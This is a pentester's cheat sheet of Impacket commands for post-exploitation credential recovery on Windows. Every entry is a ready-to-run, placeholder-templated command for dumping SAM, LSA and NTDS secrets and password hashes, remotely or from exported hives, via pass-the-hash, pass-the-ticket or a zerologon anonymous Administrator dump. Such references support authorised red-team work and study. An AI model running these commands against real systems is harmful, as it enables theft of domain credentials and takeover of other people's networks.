# Impacket

% impacket, windows, smb, 445

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-samrdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

## secretsdump - Remote dumping of SAM & LSA secrets
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>'@<IP>
```

## secretsdump - Remote dumping of SAM & LSA secrets (pass-the-hash)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -hashes '<HASH>' '<DOMAIN>/<USER>@<IP>'
```

## secretsdump - local dump - extract hash from sam database
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump - dump LSA secrets from exported hives
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -security <SECURITY_FILE|SECURITY> -system <SYSTEM_FILE|SYSTEM> LOCAL
```

## secretsdump - dump LSA secrets from exported hives
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -sam <SAM_FILE|SAM> -security <SECURITY_FILE|SECURITY> -system <SYSTEM_FILE|SYSTEM> LOCAL
```

## secretsdump - local dump - extract hash from ntds.dit
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> LOCAL
```

## secretsdump - anonymous get administrator 
zerologon
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump <DOMAIN>/<dc_bios_name>\$/@<IP> -no-pass -just-dc-user 'Administrator'
```

## secretsdump - remote extract
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

## secretsdump - remote extract + users infos
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

## secretsdump - plaintext password
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -dc-ip <DC-IP> '<DOMAIN>'/'<USER>':'<PASSWORD>'@'$<DC_HOST>'
```

## secretsdump - Pass-the-Hash
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -hashes :'<HASH>' -dc-ip '<DC-IP>' '<DOMAIN>'/'<USER>'@'<DC_HOST>'
```

## secretsdump - with Pass-the-Ticket
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip '<DC-IP>' @'<DC_HOST>'
```

